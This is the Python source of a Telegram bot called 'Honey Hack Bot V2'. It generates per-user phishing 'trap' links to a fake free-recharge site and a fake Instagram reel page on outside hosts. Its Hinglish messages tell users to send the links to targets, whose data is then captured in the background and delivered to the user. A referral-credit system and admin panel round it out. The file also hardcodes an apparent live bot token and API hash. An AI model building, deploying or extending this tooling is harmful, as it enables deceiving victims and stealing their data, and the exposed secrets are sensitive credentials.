import logging
import json
import os
import asyncio
from datetime import datetime
from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardButton, InlineKeyboardMarkup, CallbackQuery

# ================= CONFIG =================
BOT_TOKEN = "8860672316:AAGgS3DQ0eEWjsncJvFA7MQabuwR2c4Car8"
API_ID = 35444041
API_HASH = "7dd651466a69ab5fc375eb03079145a8"

ADMIN_ID = 713914937
DB_FILE = "database.json"

# UPDATED LINKS
LINK_RECHARGE = "https://zapchargefree.hostmora.app/"
LINK_REEL = "https://httpswwwinstagramcomreeldwwa3lraabvdlrfmwjyzhjpdhb2ywn5ba.hostmora.app/"

# Default Settings
DEFAULT_WELCOME = (
    "👋 Welcome <b>{name}</b> to <b>Honey Hack Bot V2</b>!\n\n"
    "Yahan se aap targets par trap set kar sakte ho aur free credits kama sakte ho.\n\n"
    "💎 <b>Your Credits:</b> <code>{credits}</code>\n"
    "🔗 <b>Referral Link:</b> <code>{ref_link}</code>\n\n"
    "Neeche diye gaye buttons se start karo:"
)
DEFAULT_IMAGE = "https://images.unsplash.com/photo-1550751827-4bd374c3f58b?q=80&w=1000&auto=format&fit=crop"

# ==========================================
logging.basicConfig(format="%(asctime)s - %(name)s - %(levelname)s - %(message)s", level=logging.INFO)
logger = logging.getLogger(__name__)

# --- Database Helpers ---
def load_db():
    if not os.path.exists(DB_FILE):
        data = {
            "users": {},
            "settings": {
                "welcome_text": DEFAULT_WELCOME,
                "welcome_image": DEFAULT_IMAGE
            },
            "maintenance": False
        }
        save_db(data)
        return data
    with open(DB_FILE, "r") as f:
        return json.load(f)

def save_db(data):
    with open(DB_FILE, "w") as f:
        json.dump(data, f, indent=4)

def get_user(user_id):
    db = load_db()
    uid = str(user_id)
    if uid not in db["users"]:
        db["users"][uid] = {
            "name": "Unknown",
            "credits": 50,
            "links_made": 0,
            "referred_by": None,
            "referrals_count": 0,
            "banned": False,
            "join_date": datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        }
        save_db(db)
    return db["users"][uid]

def update_user(user_id, key, value):
    db = load_db()
    db["users"][str(user_id)][key] = value
    save_db(db)

def add_credits(user_id, amount):
    db = load_db()
    uid = str(user_id)
    if uid in db["users"]:
        db["users"][uid]["credits"] += amount
        save_db(db)
        return True
    return False

# --- Keyboards (WITH STYLES) ---
def get_main_menu(user_id, is_admin=False):
    keyboard = [
        [InlineKeyboardButton("🎣 Free Recharge Trap", callback_data="trap_recharge", style="success")],
        [InlineKeyboardButton("🎥 Instagram Reel Trap", callback_data="trap_reel", style="primary")],
        [InlineKeyboardButton("👤 My Profile", callback_data="profile", style="primary"),
         InlineKeyboardButton("💎 Claim Credits", callback_data="claim_credits", style="success")],
        [InlineKeyboardButton("📊 Live Stats", callback_data="stats", style="primary"),
         InlineKeyboardButton("📚 Help", callback_data="help", style="success")]
    ]
    if is_admin:
        keyboard.append([InlineKeyboardButton("👑 Admin Panel", callback_data="admin_panel", style="danger")])
    return InlineKeyboardMarkup(keyboard)

def get_back_kb(callback_data="back_main"):
    return InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to Menu", callback_data=callback_data, style="primary")]])

def get_admin_kb():
    keyboard = [
        [InlineKeyboardButton("📢 Broadcast Message", callback_data="admin_broadcast", style="primary")],
        [InlineKeyboardButton("👥 Total Users", callback_data="admin_users", style="success"),
         InlineKeyboardButton("📊 Stats", callback_data="admin_stats", style="success")],
        [InlineKeyboardButton("💎 Gift Credits (User)", callback_data="admin_gift_user", style="primary"),
         InlineKeyboardButton("🎁 Gift Credits (All)", callback_data="admin_gift_all", style="primary")],
        [InlineKeyboardButton("✏️ Set Welcome Text", callback_data="admin_set_text", style="success"),
         InlineKeyboardButton("🖼 Set Welcome Image", callback_data="admin_set_img", style="success")],
        [InlineKeyboardButton("🚫 Ban User", callback_data="admin_ban", style="danger"),
         InlineKeyboardButton("✅ Unban User", callback_data="admin_unban", style="danger")],
        [InlineKeyboardButton("🔍 Check User Info", callback_data="admin_check_user", style="primary")],
        [InlineKeyboardButton("🔙 Back", callback_data="back_main", style="danger")]
    ]
    return InlineKeyboardMarkup(keyboard)

# --- Pyrogram App ---
app = Client("honey_bot", bot_token=BOT_TOKEN, api_id=API_ID, api_hash=API_HASH)

# --- Welcome Message Generator ---
async def send_welcome(client, message, is_edit=False):
    user = message.from_user
    db = load_db()
    user_data = get_user(user.id)
    
    if db["maintenance"] and user.id != ADMIN_ID:
        text = "🛠 <b>Bot is under maintenance.</b>\n\nPlease try again later."
        if is_edit:
            await message.edit_text(text, parse_mode="html")
        else:
            await message.reply_text(text, parse_mode="html")
        return

    if user_data.get("banned", False) and user.id != ADMIN_ID:
        return 

    bot_username = client.me.username
    ref_link = f"https://t.me/{bot_username}?start={user.id}"
    
    welcome_text = db["settings"]["welcome_text"].format(
        name=user.first_name,
        credits=user_data["credits"],
        ref_link=ref_link
    )
    welcome_image = db["settings"]["welcome_image"]
    kb = get_main_menu(user.id, user.id == ADMIN_ID)
    
    if is_edit:
        try: await message.delete()
        except: pass
        if welcome_image:
            try:
                await client.send_photo(chat_id=user.id, photo=welcome_image, caption=welcome_text, parse_mode="html", reply_markup=kb)
            except Exception as e:
                logger.error(f"Image send failed: {e}. Sending text only.")
                await client.send_message(chat_id=user.id, text=welcome_text, parse_mode="html", reply_markup=kb)
        else:
            await client.send_message(chat_id=user.id, text=welcome_text, parse_mode="html", reply_markup=kb)
    else:
        if welcome_image:
            try:
                await message.reply_photo(photo=welcome_image, caption=welcome_text, parse_mode="html", reply_markup=kb)
            except Exception as e:
                logger.error(f"Image send failed: {e}. Sending text only.")
                await message.reply_text(text=welcome_text, parse_mode="html", reply_markup=kb)
        else:
            await message.reply_text(text=welcome_text, parse_mode="html", reply_markup=kb)

# --- Handlers ---
@app.on_message(filters.command("start") & filters.private)
async def start(client, message):
    user = message.from_user
    db = load_db()
    
    if str(user.id) in db["users"]:
        db["users"][str(user.id)]["name"] = user.first_name
        save_db(db)
    
    # Referral logic
    if len(message.command) > 1:
        referrer_id = message.command[1]
        if referrer_id != str(user.id) and referrer_id in db["users"]:
            user_data = get_user(user.id)
            if user_data["referred_by"] is None:
                update_user(user.id, "referred_by", referrer_id)
                add_credits(referrer_id, 20)
                update_user(referrer_id, "referrals_count", db["users"][referrer_id]["referrals_count"] + 1)
                try:
                    await client.send_message(chat_id=int(referrer_id), text=f"🎉 <b>New Referral!</b>\n\nAapke link se ek naya user aaya hai. Aapko <b>20 Credits</b> mile hain!", parse_mode="html")
                except: pass

    msg = await message.reply_text("⚡ <i>Initializing Secure Connection...</i>", parse_mode="html")
    await asyncio.sleep(1.2)
    await msg.delete()

    await send_welcome(client, message)

@app.on_callback_query()
async def callback_handler(client, query: CallbackQuery):
    user_id = query.from_user.id
    data = query.data
    db = load_db()
    user_data = get_user(user_id)

    if user_data.get("banned", False) and user_id != ADMIN_ID:
        return

    if data == "back_main":
        await send_welcome(client, query.message, is_edit=True)

    elif data == "trap_recharge":
        url = f"{LINK_RECHARGE}?uid={user_id}"
        update_user(user_id, "links_made", user_data["links_made"] + 1)
        text = f"🎣 <b>Free Recharge Trap Link</b>\n\nYe link target ko bhejo:\n<code>{url}</code>\n\n<i>Jab target link kholega aur permission dega, uska data direct aapke paas aayega.</i>"
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🌐 Test Link", url=url, style="success")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main", style="primary")]
        ])
        await query.message.edit_text(text, parse_mode="html", reply_markup=kb, disable_web_page_preview=True)

    elif data == "trap_reel":
        url = f"{LINK_REEL}?uid={user_id}"
        update_user(user_id, "links_made", user_data["links_made"] + 1)
        text = f"🎥 <b>Instagram Reel Trap Link</b>\n\nYe link target ko bhejo:\n<code>{url}</code>\n\n<i>Target ko lagega wo reel dekh raha hai, par background me uska data capture hoga.</i>"
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("🌐 Test Link", url=url, style="primary")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main", style="primary")]
        ])
        await query.message.edit_text(text, parse_mode="html", reply_markup=kb, disable_web_page_preview=True)

    elif data == "profile":
        bot_username = client.me.username
        ref_link = f"https://t.me/{bot_username}?start={user_id}"
        text = (
            f"👤 <b>Your Profile</b>\n\n"
            f"🆔 ID: <code>{user_id}</code>\n"
            f"📛 Name: {user_data['name']}\n"
            f"💎 Credits: <b>{user_data['credits']}</b>\n"
            f"🔗 Links Made: <b>{user_data['links_made']}</b>\n"
            f"👥 Total Referrals: <b>{user_data['referrals_count']}</b>\n"
            f"📅 Joined: {user_data['join_date']}\n\n"
            f"🔗 <b>Your Referral Link:</b>\n<code>{ref_link}</code>"
        )
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("📤 Share Referral", url=f"https://t.me/share/url?url={ref_link}&text=Join%20Honey%20Hack%20Bot%20and%20get%20free%20credits!", style="success")],
            [InlineKeyboardButton("🔙 Back", callback_data="back_main", style="primary")]
        ])
        await query.message.edit_text(text, parse_mode="html", reply_markup=kb, disable_web_page_preview=True)

    elif data == "claim_credits":
        text = (
            "💎 <b>How to earn Credits?</b>\n\n"
            "1. <b>Referral:</b> Naye users ko refer karo. Har referral par <b>20 Credits</b> milenge.\n"
            "2. <b>Admin Gift:</b> Admin time-time par free credits baant sakta hai.\n\n"
            "Apna referral link profile me check karo!"
        )
        await query.message.edit_text(text, parse_mode="html", reply_markup=get_back_kb())

    elif data == "stats":
        total_users = len(db["users"])
        total_links = sum(u.get("links_made", 0) for u in db["users"].values())
        text = f"📊 <b>Global Stats</b>\n\n👥 Total Users: <b>{total_users}</b>\n🔗 Total Links Generated: <b>{total_links}</b>"
        await query.message.edit_text(text, parse_mode="html", reply_markup=get_back_kb())

    elif data == "help":
        text = (
            "📚 <b>Help & Guide</b>\n\n"
            "• <b>Recharge Trap:</b> Fake recharge site ka link banata hai.\n"
            "• <b>Reel Trap:</b> Fake Instagram reel ka link banata hai.\n"
            "• <b>Credits:</b> Link generate karne ke liye credits lagenge (Future update). Abhi free hai.\n\n"
            "Koi dikkat ho toh admin se contact karo."
        )
        await query.message.edit_text(text, parse_mode="html", reply_markup=get_back_kb())

    elif data == "admin_panel" and user_id == ADMIN_ID:
        text = "👑 <b>Admin Panel</b>\n\nYahan se aap bot ko completely manage kar sakte ho. Neeche diye gaye options use karo:"
        await query.message.edit_text(text, parse_mode="html", reply_markup=get_admin_kb())

    elif data.startswith("admin_") and user_id == ADMIN_ID:
        if data == "admin_users":
            text = f"👥 Total Users: <b>{len(db['users'])}</b>\n\nRecent 5 users:\n"
            for uid, u in list(db["users"].items())[-5:]:
                text += f"• <code>{uid}</code> - {u.get('name')} ({u.get('credits')} 💎)\n"
            await query.message.edit_text(text, parse_mode="html", reply_markup=get_admin_kb())
        elif data == "admin_stats":
            total_credits = sum(u.get("credits", 0) for u in db["users"].values())
            text = f"📊 <b>Detailed Stats</b>\n\n👥 Users: {len(db['users'])}\n💎 Total Credits: {total_credits}"
            await query.message.edit_text(text, parse_mode="html", reply_markup=get_admin_kb())
        elif data == "admin_broadcast":
            await query.message.edit_text("📢 <b>Broadcast Mode</b>\n\nAb jo bhi message/photo aap bhejoge, wo sabhi users ko chali jayegi.\n\n<i>Cancel karne ke liye /cancel likho.</i>", parse_mode="html")
        elif data == "admin_gift_user":
            await query.message.edit_text("💎 <b>Gift Credits to User</b>\n\nJis user ko credit dena hai, uski <b>User ID</b> bhejo:", parse_mode="html")
        elif data == "admin_gift_all":
            await query.message.edit_text("🎁 <b>Gift Credits to All</b>\n\nKitne credits sabko dene hain? (Sirf number likho, jaise 50):", parse_mode="html")
        elif data == "admin_set_text":
            await query.message.edit_text("✏️ <b>Set Welcome Text</b>\n\nNaya welcome message bhejo.\n\n<b>Note:</b> Aap <code>{name}</code>, <code>{credits}</code>, aur <code>{ref_link}</code> ka use kar sakte ho.", parse_mode="html")
        elif data == "admin_set_img":
            await query.message.edit_text("🖼 <b>Set Welcome Image</b>\n\nNayi image ka direct URL bhejo.\n\nAgar image hatani hai toh <code>none</code> likho.", parse_mode="html")
        elif data == "admin_ban":
            await query.message.edit_text("🚫 <b>Ban User</b>\n\nJis user ko ban karna hai, uski User ID bhejo:", parse_mode="html")
        elif data == "admin_unban":
            await query.message.edit_text("✅ <b>Unban User</b>\n\nJis user ko unban karna hai, uski User ID bhejo:", parse_mode="html")
        elif data == "admin_check_user":
            await query.message.edit_text("🔍 <b>Check User</b>\n\nUser ki ID bhejo jiski details chahiye:", parse_mode="html")

@app.on_message(filters.text & filters.private & ~filters.command(["start", "cancel"]))
async def handle_messages(client, message):
    user_id = message.from_user.id
    text = message.text
    
    if user_id == ADMIN_ID:
        if text.startswith("/gift "):
            parts = text.split()
            if len(parts) == 3:
                try:
                    target_id = int(parts[1])
                    amount = int(parts[2])
                    if add_credits(target_id, amount):
                        await message.reply_text(f"✅ {target_id} ko {amount} credits gift kar diye gaye.")
                        try:
                            await client.send_message(chat_id=target_id, text=f"🎁 <b>Admin Gift!</b>\n\nAdmin ne aapko <b>{amount} Credits</b> gift kiye hain!", parse_mode="html")
                        except: pass
                    else:
                        await message.reply_text("❌ User not found.")
                except:
                    await message.reply_text("❌ Invalid format. Use: /gift <id> <amount>")
        elif text.startswith("/settext "):
            new_text = text.replace("/settext ", "")
            db = load_db()
            db["settings"]["welcome_text"] = new_text
            save_db(db)
            await message.reply_text("✅ Welcome text updated!")
        elif text.startswith("/setimg "):
            new_img = text.replace("/setimg ", "")
            db = load_db()
            db["settings"]["welcome_image"] = None if new_img.lower() == "none" else new_img
            save_db(db)
            await message.reply_text("✅ Welcome image updated!")
        elif text.startswith("/ban "):
            try:
                target_id = int(text.replace("/ban ", ""))
                db = load_db()
                if str(target_id) in db["users"]:
                    db["users"][str(target_id)]["banned"] = True
                    save_db(db)
                    await message.reply_text(f"✅ User {target_id} banned.")
                else: await message.reply_text("❌ User not found.")
            except: await message.reply_text("❌ Invalid ID.")
        elif text.startswith("/unban "):
            try:
                target_id = int(text.replace("/unban ", ""))
                db = load_db()
                if str(target_id) in db["users"]:
                    db["users"][str(target_id)]["banned"] = False
                    save_db(db)
                    await message.reply_text(f"✅ User {target_id} unbanned.")
                else: await message.reply_text("❌ User not found.")
            except: await message.reply_text("❌ Invalid ID.")
        elif text.startswith("/check "):
            try:
                target_id = int(text.replace("/check ", ""))
                db = load_db()
                if str(target_id) in db["users"]:
                    u = db["users"][str(target_id)]
                    info = f"👤 <b>User Info</b>\n\n🆔 ID: <code>{target_id}</code>\n📛 Name: {u.get('name')}\n💎 Credits: {u.get('credits')}\n🔗 Links: {u.get('links_made')}\n🚫 Banned: {u.get('banned')}\n📅 Joined: {u.get('join_date')}"
                    await message.reply_text(info, parse_mode="html")
                else: await message.reply_text("❌ User not found.")
            except: await message.reply_text("❌ Invalid ID.")

@app.on_message(filters.command("cancel") & filters.private)
async def cancel_cmd(client, message):
    if message.from_user.id == ADMIN_ID:
        await message.reply_text("✅ Action cancelled.")

# --- Main ---
if __name__ == "__main__":
    logger.info("Honey Hack Bot V2 is running...")
    app.run()